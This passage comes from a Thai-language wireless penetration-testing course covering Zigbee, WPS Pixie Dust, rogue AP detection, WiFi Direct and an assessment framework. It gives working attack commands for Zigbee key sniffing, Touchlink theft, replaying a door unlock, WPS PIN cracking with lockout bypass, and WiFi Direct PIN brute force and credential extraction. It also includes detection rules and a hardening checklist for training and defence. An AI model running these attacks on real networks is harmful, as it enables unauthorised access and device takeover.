                                 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF]),
    'HA1.2': bytes([0x00] * 16)
}

class ZigbeeSecurityTester:
    """Zigbee protocol security assessment"""
    
    def setup_hardware(self):
        """ตั้งค่า hardware สำหรับ Zigbee testing"""
        hardware_setup = """
# Hardware options:
# 1. HackRF + Zigbee plugin
# 2. ATUSB (cheapest, ~$35)
# 3. CC2531 USB dongle
# 4. Ubertooth One (Bluetooth แต่ support บาง Zigbee)

# ติดตั้ง zbstumbler, killerbee
pip install killerbee
git clone https://github.com/riverloopsec/killerbee
cd killerbee && python3 setup.py install

# ตรวจสอบ device
zbid
"""
        print(hardware_setup)
    
    def scan_zigbee_networks(self, channel: int = None):
        """สแกนหา Zigbee networks"""
        scan_cmd = """
# สแกนทุก Zigbee channels (11-26)
zbstumbler

# สแกน channel เฉพาะ
zbstumbler -c 11

# Capture packets
zbreplay -c 11 -w /tmp/zigbee_capture.pcap

# ดู networks ใน wireshark
wireshark /tmp/zigbee_capture.pcap
# ใช้ Zigbee dissector
"""
        print(scan_cmd)
    
    def test_key_extraction(self):
        """ทดสอบการดึง network key"""
        print("[*] Testing Zigbee key extraction")
        
        key_extraction = """
# ดักจับ network key ตอน device join
# Network key ถูกส่งใน 'Transport Key' command

# ใช้ KillerBee zbdump
zbdump -c 11 -w /tmp/join_capture.pcap

# ทำการ factory reset device เพื่อบังคับ re-join
# แล้วดักจับ Transport Key frame

# วิเคราะห์ด้วย zbdissect
zbdissect /tmp/join_capture.pcap

# ถ้า key ถูก transport ด้วย default key:
# ถอดรหัสด้วย well-known key
from killerbee import *
import binascii

kb = KillerBee()
frame = kb.sniffer_on(channel=11)
# ถอดรหัส AES-128 CCM* ด้วย default key
"""
        print(key_extraction)
    
    def test_touchlink_theft(self):
        """ทดสอบ Touchlink commissioning theft"""
        print("[*] Testing Touchlink Commissioning Theft")
        
        touchlink_attack = """
# Touchlink ใช้ ZLL master key สำหรับ commissioning
# ผู้โจมตีสามารถ 'steal' device ด้วย high-power Touchlink request

# ใช้ KillerBee
zbtouchlink -c 15 \\
    --steal \\
    --target <device_mac> \\
    --new-network-key 'AAAAAAAAAAAAAAAA'

# หรือ reset device เป็น factory default
zbtouchlink -c 15 --factory-reset

# ป้องกัน: ปิด Touchlink หลัง commissioning
# หรือ require physical proximity (1-2cm)
"""
        print(touchlink_attack)
    
    def replay_zigbee_command(self, pcap_file: str, device_mac: str):
        """Replay Zigbee commands"""
        print(f"[*] Replaying Zigbee commands from: {pcap_file}")
        
        replay_cmd = f"""
# ใช้ KillerBee zbreplay
zbreplay \\
    -r {pcap_file} \\
    -c 11 \\
    --target {device_mac}

# เลือก specific frames ที่จะ replay
zbreplay \\
    -r {pcap_file} \\
    -c 11 \\
    --frame-range 10-15

# ตัวอย่าง: replay 'unlock door' command
# จับ command ตอน unlock จริงๆ
# แล้ว replay โดยไม่ต้องรู้ key
"""
        print(replay_cmd)
    
    def decrypt_zigbee_traffic(self, pcap_file: str, network_key: bytes):
        """ถอดรหัส Zigbee traffic"""
        print(f"[*] Decrypting Zigbee traffic")
        print(f"[*] Network key: {network_key.hex()}")
        
        decrypt_script = f"""
# Wireshark decryption
# Edit -> Preferences -> Protocols -> ZigBee
# Add network key: {network_key.hex()}

# หรือ script อัตโนมัติ
import pyshark
from killerbee.crypto import zigbee_decrypt

capture = pyshark.FileCapture('{pcap_file}', decrypt_zigbee=True)
for pkt in capture:
    if hasattr(pkt, 'zbee_nwk'):
        print(f"Frame: {{pkt.zbee_nwk}}")
"""
        print(decrypt_script)

# Z-Wave Security Testing
ZWAVE_TESTING = """
# Z-Wave Security Testing
# Hardware: Sigma Designs Z-Wave USB stick, Aeotec Z-Stick

# ติดตั้ง Z-Wave toolkit
git clone https://github.com/baol/waving-z
git clone https://github.com/Z-Wave-Me/open-zwave

# Sniff Z-Wave traffic
# Z-Wave ใช้ 908.42 MHz (US) / 868.42 MHz (EU)
hackrf_transfer \\
    -r /tmp/zwave_capture.iq \\
    -f 908420000 \\
    -s 2000000

# Decode Z-Wave frames
python3 waving-z/decoder.py /tmp/zwave_capture.iq

# Z-Wave S0 vulnerability (deprecated security mode)
# S0 uses same key for all devices in network
# Key exchanged unencrypted during inclusion
"""

if __name__ == '__main__':
    tester = ZigbeeSecurityTester()
    tester.setup_hardware()
    tester.scan_zigbee_networks()
    tester.test_key_extraction()
    tester.test_touchlink_theft()
    tester.replay_zigbee_command('/tmp/zigbee_capture.pcap', 'AA:BB:CC:DD:EE:FF:00:11')
    tester.decrypt_zigbee_traffic('/tmp/zigbee_capture.pcap', DEFAULT_KEYS['ZLL_master'])
```

---

## Step 477: WPS Attack Advanced (Pixie Dust)

### อธิบาย
การโจมตี WPS (Wi-Fi Protected Setup) ด้วย Pixie Dust attack และ Null PIN

```python
#!/usr/bin/env python3
# WPS Attack Framework

import subprocess
import re
import json
from datetime import datetime

WPS_VULNERABILITIES = {
    'pixie_dust': {
        'description': 'WPS Pixie Dust - offline PIN cracking via weak PRNG',
        'tool': 'pixiewps',
        'success_rate': '~60% of vulnerable APs',
        'time': '< 1 second (offline)'
    },
    'online_brute_force': {
        'description': 'Online WPS PIN brute force (8 digits = 11,000 attempts max)',
        'tool': 'reaver/bully',
        'success_rate': 'Depends on rate limiting',
        'time': '2-10 hours'
    },
    'null_pin': {
        'description': 'Some APs accept empty/null PIN',
        'tool': 'reaver',
        'success_rate': 'Rare but devastating',
        'time': 'Instant'
    },
    'p1_brute': {
        'description': 'Lock down after 7 failed attempts (WPS lockout)',
        'note': 'APs with no lockout are vulnerable'
    }
}

class WPSAttacker:
    """WPS vulnerability exploitation framework"""
    
    def __init__(self, interface: str = 'wlan0mon'):
        self.interface = interface
    
    def scan_wps_enabled(self) -> list:
        """สแกนหา APs ที่เปิด WPS"""
        print("[*] Scanning for WPS-enabled APs...")
        
        wash_cmd = f"""
# ใช้ wash เพื่อหา WPS-enabled APs
wash -i {self.interface} -C -s

# Output:
# BSSID | Ch | dBm | WPS | Lck | ESSID

# Lck = WPS Locked (1 = locked after failed attempts)
"""
        print(wash_cmd)
        
        # จำลอง results
        mock_results = [
            {'bssid': 'AA:BB:CC:DD:EE:FF', 'ssid': 'HomeWifi', 'channel': 6, 
             'wps_version': '2.0', 'locked': False, 'manufacturer': 'TP-Link'},
            {'bssid': '11:22:33:44:55:66', 'ssid': 'Office', 'channel': 11,
             'wps_version': '1.0', 'locked': False, 'manufacturer': 'Netgear'}
        ]
        return mock_results
    
    def pixie_dust_attack(self, target_bssid: str, channel: int):
        """Pixie Dust attack - offline WPS PIN cracking"""
        print(f"\n[*] Pixie Dust Attack on {target_bssid}")
        print("[*] This exploits weak PRNG in AP's WPS implementation")
        
        attack_cmd = f"""
# ติดตั้ง reaver + pixiewps
apt-get install reaver pixiewps -y

# Pixie Dust attack
reaver \\
    -i {self.interface} \\
    -b {target_bssid} \\
    -c {channel} \\
    -vvv \\
    -K 1 \\
    -f \\
    -N

# -K 1 = Pixie Dust mode
# -f = Fixed channel
# -N = Don't send NACK

# หรือใช้ bully
bully \\
    -b {target_bssid} \\
    -c {channel} \\
    -d \\
    {self.interface}

# Expected output:
# [+] WPS pin: 12345678
# [+] WPA PSK: 'NetworkPassword123'
"""
        print(attack_cmd)
    
    def manual_pixie_dust(self, pkr: str, pke: str, authkey: str, e_hash1: str, e_hash2: str, e_nonce: str):
        """Manual Pixie Dust ด้วยข้อมูลจาก WPS exchange"""
        print("[*] Manual Pixie Dust calculation")
        
        pixiewps_cmd = f"""
# รวบรวมค่าจาก WPS M1/M2 exchange (ใช้ wireshark)
# PKR = Registrar Public Key
# PKE = Enrollee Public Key  
# AuthKey = Auth key derived from DH exchange
# E-Hash1, E-Hash2 = Enrollee hashes
# E-Nonce = Enrollee Nonce

pixiewps \\
    -e {pke} \\
    -r {pkr} \\
    -s {e_hash1} \\
    -z {e_hash2} \\
    -a {authkey} \\
    -n {e_nonce}

# Output: WPS PIN
"""
        print(pixiewps_cmd)
    
    def null_pin_attack(self, target_bssid: str, channel: int):
        """Null PIN attack"""
        print(f"\n[*] Testing Null PIN attack")
        
        null_pin_cmd = f"""
# ทดสอบ null PIN
reaver \\
    -i {self.interface} \\
    -b {target_bssid} \\
    -c {channel} \\
    -p '' \\
    -vvv

# บาง APs รับ PIN = '00000000'
reaver \\
    -i {self.interface} \\
    -b {target_bssid} \\
    -c {channel} \\
    -p '00000000'
"""
        print(null_pin_cmd)
    
    def anti_lockout_bypass(self, target_bssid: str, channel: int):
        """Bypass WPS lockout ด้วย MAC spoofing"""
        print("[*] Bypassing WPS lockout")
        
        bypass_cmd = f"""
# เปลี่ยน MAC address ทุกครั้งที่ถูก lock
macchanger -r {self.interface}

# หรือใช้ delay
reaver \\
    -i {self.interface} \\
    -b {target_bssid} \\
    -c {channel} \\
    -d 30 \\
    --ignore-locks

# MDK3 deauth ระหว่าง brute force (บาง AP unlock หลัง deauth)
mdk3 {self.interface} d -B {target_bssid}
"""
        print(bypass_cmd)
    
    def generate_report(self, results: list) -> str:
        """สร้าง WPS attack report"""
        report_lines = [
            f"WPS Attack Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "=" * 60,
            f"Total targets: {len(results)}",
            ""
        ]
        
        for r in results:
            status = "VULNERABLE" if r.get('cracked') else "NOT CRACKED"
            report_lines.append(f"[{status}] {r.get('bssid')} - {r.get('ssid')}")
            if r.get('pin'):
                report_lines.append(f"  WPS PIN: {r['pin']}")
                report_lines.append(f"  WiFi Password: {r.get('password', 'Unknown')}")
        
        return '\n'.join(report_lines)

if __name__ == '__main__':
    attacker = WPSAttacker('wlan0mon')
    
    targets = attacker.scan_wps_enabled()
    
    for target in targets:
        if not target['locked']:
            attacker.pixie_dust_attack(target['bssid'], target['channel'])
```

---

## Step 478: Rogue AP Detection Techniques

### อธิบาย
การตรวจจับ Rogue APs และ Evil Twins ที่อาจแทรกซึมเข้ามาในเครือข่าย

```python
#!/usr/bin/env python3
# Rogue AP Detection Framework

import subprocess
import json
import hashlib
import time
from collections import defaultdict
from datetime import datetime

class RogueAPDetector:
    """Rogue Access Point detection system"""
    
    def __init__(self, authorized_aps: list = None):
        # รายชื่อ APs ที่ได้รับอนุญาต
        self.authorized_aps = authorized_aps or []
        self.known_bssids = {ap['bssid'] for ap in self.authorized_aps}
        self.known_ssids = {ap['ssid'] for ap in self.authorized_aps}
        self.alerts = []
    
    def scan_environment(self, interface: str = 'wlan0mon') -> list:
        """สแกนหา APs ทั้งหมด"""
        scan_cmd = f"""
# ใช้ airodump-ng scan
airodump-ng \\
    --output-format csv \\
    -w /tmp/rogue_scan \\
    --write-interval 10 \\
    {interface}

# หรือ iwlist scan
iwlist {interface.replace('mon', '')} scanning | grep -E 'ESSID|Address|Channel'
"""
        print(scan_cmd)
        
        # จำลอง scan results
        mock_aps = [
            {'bssid': 'AA:BB:CC:DD:EE:FF', 'ssid': 'CorpWiFi', 'channel': 6, 
             'signal': -55, 'encryption': 'WPA2', 'vendor': 'Cisco'},
            {'bssid': '11:22:33:44:55:66', 'ssid': 'CorpWiFi', 'channel': 6,
             'signal': -45, 'encryption': 'WPA2', 'vendor': 'Unknown'},  # Rogue!
            {'bssid': 'FF:EE:DD:CC:BB:AA', 'ssid': 'FreeWiFi', 'channel': 1,
             'signal': -70, 'encryption': 'Open', 'vendor': 'TP-Link'}
        ]
        return mock_aps
    
    def detect_evil_twin(self, scan_results: list) -> list:
        """ตรวจจับ Evil Twin APs"""
        print("\n[*] Detecting Evil Twin APs...")
        evil_twins = []
        
        # Group APs by SSID
        ssid_groups = defaultdict(list)
        for ap in scan_results:
            ssid_groups[ap['ssid']].append(ap)
        
        for ssid, aps in ssid_groups.items():
            if len(aps) > 1:
                # Multiple APs with same SSID
                authorized = [ap for ap in aps if ap['bssid'] in self.known_bssids]
                unauthorized = [ap for ap in aps if ap['bssid'] not in self.known_bssids]
                
                if unauthorized and authorized:
                    for rogue in unauthorized:
                        evil_twins.append({
                            'type': 'EVIL_TWIN',
                            'severity': 'CRITICAL',
                            'rogue_bssid': rogue['bssid'],
                            'ssid': ssid,
                            'signal': rogue['signal'],
                            'description': f"Unauthorized AP impersonating '{ssid}'"
                        })
                        print(f"[!] EVIL TWIN DETECTED: {rogue['bssid']} impersonating '{ssid}'")
        
        return evil_twins
    
    def detect_deauth_attacks(self, interface: str = 'wlan0mon'):
        """ตรวจจับ deauthentication attacks"""
        print("\n[*] Monitoring for deauth attacks...")
        
        detect_cmd = f"""
# ใช้ airodump-ng + script
airodump-ng {interface} -w /tmp/deauth_monitor --output-format csv &

# วิเคราะห์ด้วย script
python3 deauth_detector.py --watch /tmp/deauth_monitor.csv

# หรือใช้ kismet
kismet --source=hci0:type=linuxwifi

# Alert rules:
# > 10 deauth frames/second from same MAC = attack
# Broadcast deauth = attack
"""
        print(detect_cmd)
    
    def detect_karma_attack(self, scan_results: list) -> list:
        """ตรวจจับ KARMA attack (respond to any probe)"""
        print("\n[*] Detecting KARMA attacks...")
        karma_indicators = []
        
        # KARMA APs ตอบสนอง probe requests ทุกตัว
        # ตรวจจับ: AP ที่มีหลาย SSID จาก BSSID เดียวกัน
        bssid_ssids = defaultdict(set)
        for ap in scan_results:
            bssid_ssids[ap['bssid']].add(ap['ssid'])
        
        for bssid, ssids in bssid_ssids.items():
            if len(ssids) > 3:  # Suspicious: same BSSID with many SSIDs
                karma_indicators.append({
                    'type': 'KARMA_ATTACK',
                    'bssid': bssid,
                    'ssids': list(ssids),
                    'description': 'Possible KARMA attack - AP responds to multiple SSIDs'
                })
        
        return karma_indicators
    
    def verify_ap_certificate(self, bssid: str, ssid: str):
        """ตรวจสอบ certificate ของ AP (สำหรับ 802.1X)"""
        print(f"\n[*] Verifying AP certificate for {ssid}")
        
        verify_script = f"""
# ตรวจสอบ EAP certificate
# เมื่อ connect ไปยัง WPA2-Enterprise
# ดู certificate ที่ AP ส่งมา

# ใช้ wpa_supplicant ด้วย verbose logging
wpa_supplicant \\
    -D nl80211 \\
    -i wlan0 \\
    -c /etc/wpa_supplicant/wpa_supplicant.conf \\
    -d 2>&1 | grep -i 'certificate\\|cert\\|ssl'

# ตรวจสอบ Common Name ใน certificate
# ต้องตรงกับ domain ของบริษัท เช่น radius.company.com

# Script ตรวจสอบ cert fingerprint
openssl s_client -connect {bssid}:443 2>/dev/null | \\
    openssl x509 -fingerprint -noout
"""
        print(verify_script)
    
    def generate_wids_rules(self) -> str:
        """สร้าง WIDS detection rules"""
        wids_rules = """
# Wireless Intrusion Detection Rules

# Rule 1: Evil Twin Detection
if same_ssid and different_bssid and not_authorized:
    alert EVIL_TWIN

# Rule 2: Deauth Flood
if deauth_count > 10 per second from same_src:
    alert DEAUTH_ATTACK

# Rule 3: Probe Response to All Requests
if ap_responds_to_all_probes:
    alert KARMA_ATTACK

# Rule 4: Unauthorized AP
if bssid not in whitelist and ssid matches known_ssid:
    alert ROGUE_AP

# Rule 5: WEP/Open Network with known SSID
if ssid in corporate_ssids and encryption not in ['WPA2', 'WPA3']:
    alert SECURITY_DOWNGRADE

# Implementation with Kismet alerting:
cat >> /etc/kismet/kismet.conf << 'EOF'
alert=SSIDMATCH,10/min,10/sec
alert=BSSMATCH,10/min,10/sec
alert=DEAUTHFLOOD,10/min,10/sec
EOF
"""
        return wids_rules
    
    def run_full_detection(self, interface: str = 'wlan0mon'):
        """รัน full rogue AP detection"""
        print("[*] Starting Rogue AP Detection...")
        
        scan_results = self.scan_environment(interface)
        evil_twins = self.detect_evil_twin(scan_results)
        karma = self.detect_karma_attack(scan_results)
        
        all_alerts = evil_twins + karma
        
        if all_alerts:
            print(f"\n[!] ALERTS: {len(all_alerts)} threats detected")
            for alert in all_alerts:
                print(f"  [{alert['type']}] {alert.get('description', '')}")
        else:
            print("[+] No rogue APs detected")
        
        return all_alerts

if __name__ == '__main__':
    authorized_aps = [
        {'bssid': 'AA:BB:CC:DD:EE:FF', 'ssid': 'CorpWiFi'},
        {'bssid': 'BB:CC:DD:EE:FF:00', 'ssid': 'CorpWiFi-5G'}
    ]
    
    detector = RogueAPDetector(authorized_aps)
    alerts = detector.run_full_detection('wlan0mon')
    print(detector.generate_wids_rules())
```

---

## Step 479: WiFi Direct Security Testing

### อธิบาย
การทดสอบความปลอดภัยของ WiFi Direct ซึ่งใช้สำหรับการเชื่อมต่อ device-to-device โดยตรง

```python
#!/usr/bin/env python3
# WiFi Direct Security Testing

import subprocess
import socket
import struct

WIFI_DIRECT_VULNERABILITIES = [
    'Weak WPS PIN (automatic key generation)',
    'No authentication for P2P invitation',
    'Persistent group credentials stored insecurely',
    'GO (Group Owner) negotiation denial of service',
    'P2P device discovery information leakage'
]

class WiFiDirectTester:
    """WiFi Direct security assessment"""
    
    def discover_p2p_devices(self, interface: str = 'wlan0'):
        """ค้นหา WiFi Direct devices"""
        discover_cmds = f"""
# ค้นหา WiFi Direct (P2P) devices
wpa_cli -i {interface} p2p_find

# ดู devices ที่พบ
wpa_cli -i {interface} p2p_peers

# ดูข้อมูล device
wpa_cli -i {interface} p2p_peer <peer_mac>

# Monitor P2P events
wpa_cli -i {interface} monitor | grep P2P
"""
        print(discover_cmds)
    
    def test_wps_pin_brute(self, peer_mac: str):
        """Brute force WPS PIN ใน P2P connection"""
        print(f"[*] Brute forcing WPS PIN for P2P: {peer_mac}")
        
        brute_cmd = f"""
# WiFi Direct ใช้ WPS สำหรับ key exchange
# ทดสอบ common PINs

for pin in 12345670 00000000 11111111 22222222 99999999; do
    wpa_cli -i wlan0 p2p_connect {peer_mac} $pin display
    sleep 2
done

# ตรวจสอบ automatic PIN generation ใน Android:
# Android 4.4 และเก่ากว่า ใช้ predictable PINs
"""
        print(brute_cmd)
    
    def exploit_go_negotiation(self, interface: str = 'wlan0'):
        """Exploit Group Owner negotiation"""
        print("[*] Testing GO Negotiation DoS")
        
        go_exploit = f"""
# Force เป็น Group Owner ด้วย GO Intent = 15
wpa_cli -i {interface} set p2p_go_intent 15

# สร้าง autonomous GO
wpa_cli -i {interface} p2p_group_add

# แล้วส่ง invitation ไปยัง target
wpa_cli -i {interface} p2p_invite group=p2p-{interface}-0 peer=<target_mac>

# GO Negotiation DoS:
# ส่ง P2P Negotiation Request ซ้ำๆ
# ทำให้ device busy จนไม่รับ request จากคนอื่น
"""
        print(go_exploit)
    
    def extract_persistent_credentials(self):
        """ดึง WiFi Direct credentials ที่เก็บ persistently"""
        extract_cmd = """
# WiFi Direct persistent credentials เก็บใน:
# Android: /data/misc/wifi/wpa_supplicant.conf
# Linux: /etc/wpa_supplicant/wpa_supplicant.conf

# ดูข้อมูล P2P persistent groups
wpa_cli list_networks | grep P2P
wpa_cli get_network <id> psk
wpa_cli get_network <id> ssid

# บน Android (ต้อง root)
adb shell cat /data/misc/wifi/wpa_supplicant.conf | grep -A 10 p2p_persistent
"""
        print(extract_cmd)
    
    def monitor_p2p_traffic(self):
        """Monitor WiFi Direct traffic"""
        monitor_cmd = """
# Monitor P2P traffic ด้วย tcpdump
tcpdump -i p2p-wlan0-0 -w /tmp/p2p_capture.pcap

# หรือ wireshark filter:
# wlan.fc.type_subtype == 0x0d  (Probe Response)
# wlan.tag.number == 221 && wlan.tag.oui == 50:6f:9a  (P2P IE)

# ดู P2P Service Discovery
wireshark -r /tmp/p2p_capture.pcap -Y 'wlan.tag.vendor.oui == 50:6f:9a'
"""
        print(monitor_cmd)

# Wireless Security Hardening Checklist
WIRELESS_HARDENING = """
# Wireless Security Hardening Checklist

# 1. Network Configuration
☐ ใช้ WPA3 แทน WPA2 ที่ AP ทุกตัว
☐ เปิด Protected Management Frames (PMF/802.11w)
☐ ปิด WPS ทุก AP
☐ ปิด WiFi Direct ถ้าไม่จำเป็น
☐ แยก Guest Network จาก Corporate Network
☐ ใช้802.1X/RADIUS แทน Pre-Shared Key

# 2. WIDS/WIPS
☐ Deploy Wireless IDS/IPS
☐ Monitor สำหรับ Rogue APs
☐ Alert เมื่อพบ deauth floods
☐ Whitelist authorized BSSIDs

# 3. Client Security
☐ Enforce WPA3-SAE บน clients
☐ Verify RADIUS server certificate
☐ ปิด auto-connect to open networks
☐ ใช้ VPN บน wireless

# 4. Physical Security  
☐ ปรับ TX power ให้เหมาะสม
☐ ตรวจสอบ AP placement
☐ Log และ audit AP configurations
"""

if __name__ == '__main__':
    tester = WiFiDirectTester()
    tester.discover_p2p_devices()
    tester.test_wps_pin_brute('AA:BB:CC:DD:EE:FF')
    tester.exploit_go_negotiation()
    tester.extract_persistent_credentials()
    print(WIRELESS_HARDENING)
```

---

## Step 480: Wireless Security Hardening & Assessment Framework

### อธิบาย
การสร้าง comprehensive wireless security assessment framework และ hardening guide

```python
#!/usr/bin/env python3
# Comprehensive Wireless Security Assessment Framework

import json
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum

class WirelessRisk(Enum):
    CRITICAL = 'CRITICAL'
    HIGH = 'HIGH'
    MEDIUM = 'MEDIUM'
    LOW = 'LOW'
    INFO = 'INFO'

@dataclass
class WirelessFinding:
    title: str
    risk: WirelessRisk
    bssid: str
    ssid: str
    description: str
    recommendation: str
    evidence: str = ""

@dataclass
class WirelessAssessmentReport:
    target_organization: str
    assessment_date: str
    assessor: str
    scope: List[str] = field(default_factory=list)
    findings: List[WirelessFinding] = field(default_factory=list)
    executive_summary: str = ""

class WirelessAssessmentFramework:
    """Comprehensive wireless security assessment"""
    
    def __init__(self, org_name: str):
        self.org_name = org_name
        self.report = WirelessAssessmentReport(
            target_organization=org_name,
            assessment_date=time.strftime('%Y-%m-%d'),
            assessor='Penetration Tester'
        )
        self.checks_performed = []
    
    def run_full_assessment(self, interface: str = 'wlan0mon'):
        """รัน full wireless assessment"""
        print(f"[*] Starting wireless assessment for: {self.org_name}")
        print(f"[*] Interface: {interface}")
        print("="*60)
        
        # 1. Network Discovery
        self._check_network_discovery(interface)
        
        # 2. Encryption Assessment  
        self._check_encryption()
        
        # 3. Authentication Assessment
        self._check_authentication()
        
        # 4. Rogue AP Detection
        self._check_rogue_aps()
        
        # 5. Client Security
        self._check_client_security()
        
        # 6. Physical Security
        self._check_physical_security()
        
        # 7. Generate Report
        return self._generate_report()
    
    def _check_network_discovery(self, interface: str):
        """ตรวจสอบ network visibility"""
        print("\n[1/6] Network Discovery")
        
        discovery_commands = f"""
# Full network scan
airodump-ng \\
    --band abg \\
    --output-format csv,pcap \\
    -w /tmp/wireless_assessment \\
    {interface}

# Hidden SSID detection
airodump-ng {interface} | grep '\\\\x00'

# Channel analysis
for ch in $(seq 1 14); do
    iwconfig {interface.replace('mon','')} channel $ch
    sleep 1
    iwlist {interface.replace('mon','')} scanning | grep ESSID
done
"""
        print(discovery_commands)
        
        # Simulated finding
        self.report.findings.append(WirelessFinding(
            title="Hidden SSID Network Detected",
            risk=WirelessRisk.LOW,
            bssid="AA:BB:CC:DD:EE:FF",
            ssid="<hidden>",
            description="A network with hidden SSID was detected. Hidden SSIDs provide minimal security.",
            recommendation="Hidden SSIDs do not provide security. Use proper authentication instead."
        ))
    
    def _check_encryption(self):
        """ตรวจสอบ encryption standards"""
        print("\n[2/6] Encryption Assessment")
        
        encryption_checks = """
# ตรวจสอบ WEP networks
airodump-ng wlan0mon | grep WEP

# ตรวจสอบ Open networks
airodump-ng wlan0mon | grep -i 'OPN'

# ตรวจสอบ WPA version
airodump-ng wlan0mon | awk '{print $6, $7, $14}'

# ตรวจสอบ Management Frame Protection
wifi-dump wlan0 | grep 'RSN Capabilities'
# Bit 6: PMF required
# Bit 7: PMF capable
"""
        print(encryption_checks)
    
    def _check_authentication(self):
        """ตรวจสอบ authentication mechanisms"""
        print("\n[3/6] Authentication Assessment")
        
        auth_checks = """
# ตรวจสอบ WPS
wash -i wlan0mon -C

# ตรวจสอบ 802.1X / EAP type
eaplist -i wlan0 -e TargetSSID

# RADIUS shared secret strength
if wireshark capture available:
    radius2john capture.pcap | john --wordlist=rockyou.txt

# EAP method downgrade test
test EAP-MD5 acceptance (indicates weak auth)
"""
        print(auth_checks)
    
    def _check_rogue_aps(self):
        """ตรวจสอบ rogue APs"""
        print("\n[4/6] Rogue AP Detection")
        
        rogue_checks = """
# Compare against authorized AP list
python3 rogue_detector.py \\
    --authorized authorized_aps.json \\
    --interface wlan0mon

# Kismet for continuous monitoring
kismet -c wlan0mon:name=survey

# Wireless threat analysis
wifite2 --scan --kill
"""
        print(rogue_checks)
    
    def _check_client_security(self):
        """ตรวจสอบ client security"""
        print("\n[5/6] Client Security")
        
        client_checks = """
# Monitor probe requests (reveals preferred networks)
airodump-ng wlan0mon | grep -E 'Station|Probed'

# Pineapple-style open network attack test
# สร้าง open AP ที่มีชื่อเดียวกับที่ clients probe

# Test client certificate validation
# สร้าง rogue AP ด้วย self-signed cert
# ดูว่า client accept หรือ reject

# Auto-connect behavior
# ดู clients ที่ automatically connect to rogue AP
"""
        print(client_checks)
    
    def _check_physical_security(self):
        """ตรวจสอบ physical security"""
        print("\n[6/6] Physical Security")
        
        physical_checks = """
# Signal strength mapping (wardrive)
wifite2 --scan
gpsd -N /dev/ttyUSB0 &  # GPS module
kismet --source=wlan0mon -gps gpsd://localhost

# หา APs ที่อยู่นอก building coverage
# สัญญาณแรงมากนอก perimeter = misconfigured TX power

# ตรวจสอบ unauthorized APs ที่ installed โดย employees
nmap -sn 192.168.1.0/24 | grep -B 1 'Cisco\\|Aruba\\|Ruckus'
"""
        print(physical_checks)
    
    def _generate_report(self) -> WirelessAssessmentReport:
        """สร้าง assessment report"""
        critical = [f for f in self.report.findings if f.risk == WirelessRisk.CRITICAL]
        high = [f for f in self.report.findings if f.risk == WirelessRisk.HIGH]
        medium = [f for f in self.report.findings if f.risk == WirelessRisk.MEDIUM]
        
        self.report.executive_summary = f"""
Wireless Security Assessment for {self.org_name}
Date: {self.report.assessment_date}

Findings Summary:
  Critical: {len(critical)}
  High:     {len(high)}
  Medium:   {len(medium)}
  
Key Risks:
- Unauthorized access through weak authentication
- Data interception via rogue AP attacks
- Network infiltration through misconfigured devices

Recommendations Priority:
1. Deploy WPA3 enterprise with valid certificates
2. Implement WIDS/WIPS solution
3. Disable WPS on all APs
4. Regular wireless security audits
"""
        
        print("\n" + "="*60)
        print(self.report.executive_summary)
        print("="*60)
        
        return self.report

# ตัวอย่างการใช้งาน
if __name__ == '__main__':
    framework = WirelessAssessmentFramework('TechCorp International')
    report = framework.run_full_assessment('wlan0mon')
    
    # Export report
    report_data = {
        'organization': report.target_organization,
        'date': report.assessment_date,
        'findings': [
            {
                'title': f.title,
                'risk': f.risk.value,
                'bssid': f.bssid,
                'ssid': f.ssid,
                'description': f.description,
                'recommendation': f.recommendation
            }
            for f in report.findings
        ],
        'summary': report.executive_summary
    }
    
    with open('/tmp/wireless_assessment_report.json', 'w') as fp:
        json.dump(report_data, fp, indent=2)
    
    print(f"[+] Report saved to: /tmp/wireless_assessment_report.json")
```

---

## สรุป Part 48

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 471 | WPA3-SAE Dragonblood | dragonslayer, dragontime, pixiewps |
| 472 | PMKID WPA2 Cracking | hcxdumptool, hcxtools, hashcat |
| 473 | Advanced Evil Twin | hostapd-wpe, dnsmasq, mitmproxy |
| 474 | 802.1X/RADIUS Testing | FreeRADIUS, eapmd5pass, pyrad |
| 475 | Bluetooth LE Security | bluepy, InternalBlue, btlejuice |
| 476 | Zigbee Security | KillerBee, zbstumbler, pixiewps |
| 477 | WPS Pixie Dust Attack | reaver, bully, wash |
| 478 | Rogue AP Detection | airodump-ng, Kismet, custom WIDS |
| 479 | WiFi Direct Testing | wpa_cli, p2p tools |
| 480 | Wireless Assessment Framework | Comprehensive assessment tool |

**Tools Summary:**
- `hcxdumptool` + `hcxtools`: PMKID capture
- `hostapd-wpe`: WPA-Enterprise credential capture  
- `reaver` + `pixiewps`: WPS attacks
- `KillerBee`: Zigbee security testing
- `bluepy` + `InternalBlue`: BLE testing
- `Kismet`: WIDS/WIPS platform
